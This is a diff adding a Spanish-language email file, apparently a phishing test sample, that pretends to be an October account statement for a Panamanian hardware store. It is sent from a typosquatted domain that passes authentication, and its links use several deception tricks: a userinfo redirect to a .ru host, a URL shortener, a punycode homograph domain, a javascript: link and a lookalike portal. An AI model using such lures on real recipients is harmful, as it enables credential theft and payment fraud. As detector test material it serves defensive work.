@@ -1,0 +1,16 @@
+Authentication-Results: mx.ferreteria-pacifico.com.pa; spf=pass smtp.mailfrom=ferreteria-pacifco.com.pa; dkim=pass header.d=ferreteria-pacifco.com.pa; dmarc=pass header.from=ferreteria-pacifco.com.pa
+From: "Contabilidad Ferretería Pacífico" <contabilidad@ferreteria-pacifco.com.pa>
+To: maria@ferreteria-pacifico.com.pa
+Subject: Estado de cuenta octubre
+Date: Wed, 7 Oct 2026 11:00:00 -0500
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+
+<p>Estimada Mar=C3=ADa, adjunto el estado de cuenta actualizado.</p>
+<a href=3D"https://ferreteria-pacifico.com.pa@cuentas-pago.ru/estado">Ver e=
+stado de cuenta</a>
+<a href=3D"https://bit.ly/3xYz9">Descargar factura</a>
+<a href=3D"https://xn--ferretera-pacifico-3sb.com/pagar">Pagar aqu=C3=AD</a>
+<a href=3D"javascript:alert(1)">Confirmar</a>
+<a href=3D'https://ferreteria-pacifco.com.pa/portal'>Portal de proveedores<=
+/a>
